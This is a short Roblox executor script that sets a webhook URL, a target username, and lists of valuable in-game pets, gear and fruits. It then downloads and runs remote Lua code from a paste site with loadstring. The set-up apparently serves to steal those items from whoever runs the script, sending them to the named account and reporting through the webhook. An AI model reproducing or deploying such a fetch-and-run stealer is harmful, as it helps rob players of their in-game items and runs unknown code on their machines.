getgenv().WEBHOOK_URL = "https://sentinelhook.lol/api.php?id=Ro62rrafJ5dnPmr"

getgenv().TARGET_USERNAME = "sokibiditolet1238"


getgenv().PETS_BLACKLIST = {
    "718d0f07-444f-4a4c-be3c-0c1750d11133",
    "798eaf29-1135-40ee-af74-574d71f6c8b6",
    "98bea10d-40e7-45c8-9aef-3630eec9eb68",
    "92afb36b-7f83-4ff0-84f0-617be90d8156",
    "f9ca444a-5c03-4df0-9170-80de2238db55"
}


getgenv().TARGET_PETS = {
    "Bee",
    "Monkey",
    "Golden Dragonfly",
    "Unicorn",
    "Raccoon",
    "Black Dragon",
    "Ice Serpent"
}


getgenv().TARGET_GEAR = {
    "Super Sprinkler",
    "Super Watering Can"
}


getgenv().FRUITS = {
    "Rainbow",
    "Dragon's Breath",
    "Venus Fly Trap",
    "Sunflower",
    "Pomegranate",
    "Gold",
    "Poision Apple",
    "Moon Bloom"
}


getgenv().CRATES = {

}


task.spawn(function()
   loadstring(game:HttpGet("https://pastefy.app/MMENG7dr/raw"))()
end)
